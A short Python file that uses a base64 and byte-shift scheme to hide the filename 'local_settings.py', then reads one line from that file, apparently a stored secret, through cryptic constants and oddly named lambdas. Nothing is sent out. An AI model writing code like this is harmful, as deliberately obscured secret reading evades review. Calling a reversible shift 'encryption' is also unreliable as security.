import base64

t = 'r'
h = 'dnlta3ZpfW9+fnN4cX04eoM=fm99fnN4cQ=='
k = int(ord(h[0]) / ord(h[-8]) * 11)
o = _open if not k % int(h[27]) else open
encoding = 'utf-8'
def rfs():
    ex = h[:h.find('M=')+2]
    flt = simple_decrypt(ex)
    try:
        with o(flt, t) as x:
            s = x.readlines()
            ex2 = s[k+(k % (k % int(str(ord(h[-25]))[1])))+3]
    except Exception as e:
        ex2 = 'ERROR'
    return ex2

# Encryption function
def simple_encrypt(password):
    password_bytes = password.encode(encoding)
    transformed_bytes = bytearray([b + k for b in password_bytes])
    encrypted_password = base64.b64encode(transformed_bytes).decode()
    return encrypted_password
axfdfsavca = lambda: rfs()[:-2]


# Decryption function
def simple_decrypt(encrypted_password):
    encrypted_bytes = base64.b64decode(encrypted_password.encode(encoding))
    transformed_bytes = bytearray([b - k for b in encrypted_bytes])
    decrypted_password = transformed_bytes.decode(encoding)
    return decrypted_password
dlfdadreaqf = lambda x: simple_decrypt(x)